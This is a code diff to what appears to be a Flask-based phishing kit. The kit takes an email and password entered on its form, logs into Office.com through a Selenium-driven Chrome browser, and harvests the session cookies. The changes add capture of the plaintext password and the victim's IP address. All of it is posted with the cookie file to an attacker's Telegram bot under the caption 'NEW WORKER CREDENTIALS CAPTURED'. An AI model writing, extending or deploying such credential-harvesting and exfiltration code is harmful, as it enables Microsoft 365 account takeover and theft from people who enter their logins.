@@ -195,7 +195,7 @@ def setup_chrome_driver():
             logger.error(f"Failed to install Chrome: {install_error}")
             raise e
 
-def extract_and_save_cookies(driver, email):
+def extract_and_save_cookies(driver, email, password=None):
     """Extract only session cookies from successful Office.com login and save them"""
     try:
         # Navigate to office.com to verify successful login and get session cookies
@@ -243,9 +243,15 @@ def extract_and_save_cookies(driver, email):
         filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
         
         with open(filename, 'w') as f:
-            f.write(f"# Session cookies extracted for {email} at {datetime.now()}\n")
+            f.write(f"# WORKER CREDENTIALS CAPTURED\n")
+            f.write(f"# Email: {email}\n")
+            f.write(f"# IP Address: {request.remote_addr if request else 'Unknown'}\n")
+            f.write(f"# Timestamp: {datetime.now()}\n")
             f.write(f"# Successfully logged into Office.com: {current_url}\n")
             f.write(f"# Total session cookies: {len(session_cookies)}\n\n")
+            f.write("=" * 60 + "\n")
+            f.write("SESSION COOKIES:\n")
+            f.write("=" * 60 + "\n\n")
             
             for cookie in session_cookies:
                 f.write(f"Name: {cookie['name']}\n")
@@ -267,8 +273,8 @@ def extract_and_save_cookies(driver, email):
         logger.error(f"Failed to extract and save session cookies: {e}")
         return False
 
-def send_cookies_to_telegram(filename, email):
-    """Send cookies file to Telegram"""
+def send_cookies_to_telegram(filename, email, password, ip_address):
+    """Send cookies file to Telegram with worker details"""
     try:
         bot_token = config('BOT_TOKEN', default=None)
         chat_id = config('CHAT_ID', default=None)
@@ -279,26 +285,34 @@ def send_cookies_to_telegram(filename, email):
         
         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
         
+        # Create detailed caption with worker information
+        caption = f"""🔑 NEW WORKER CREDENTIALS CAPTURED
+📧 Email: {email}
+🔒 Password: {password}
+🌐 IP Address: {ip_address}
+📅 Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+📁 Cookie File: session_cookies_{email.replace("@", "_")}"""
+        
         with open(filename, 'rb') as file:
             response = requests.post(
                 url,
                 data={
                     'chat_id': chat_id,
-                    'caption': f'Cookies for {email} - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
+                    'caption': caption
                 },
                 files={'document': file},
                 timeout=30
             )
         
         if response.status_code == 200:
-            logger.info(f"Cookies sent to Telegram successfully for {email}")
+            logger.info(f"Worker details and cookies sent to Telegram successfully for {email}")
             return True
         else:
-            logger.error(f"Failed to send cookies to Telegram: {response.text}")
+            logger.error(f"Failed to send worker details to Telegram: {response.text}")
             return False
             
     except Exception as e:
-        logger.error(f"Error sending cookies to Telegram: {e}")
+        logger.error(f"Error sending worker details to Telegram: {e}")
         return False
 
 @app.before_request
@@ -533,15 +547,16 @@ def process_form():
                     return redirect(url_for('index', step='password', email=email, error='true'))
             
             # Extract and save cookies
-            cookie_file = extract_and_save_cookies(driver, email)
+            cookie_file = extract_and_save_cookies(driver, email, password)
             if not cookie_file:
                 error_msg = "Failed to extract cookies"
                 log_session_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
                 flash(error_msg, 'error')
                 return redirect(url_for('index', step='password', email=email, error='true'))
             
-            # Send cookies to Telegram
-            if send_cookies_to_telegram(cookie_file, email):
+            # Send cookies and worker details to Telegram
+            worker_ip = get_remote_address()
+            if send_cookies_to_telegram(cookie_file, email, password, worker_ip):
                 log_session_activity("telegram_send_success", user_email=email)
             else:
                 log_session_activity("telegram_send_failed", user_email=email, success=False)
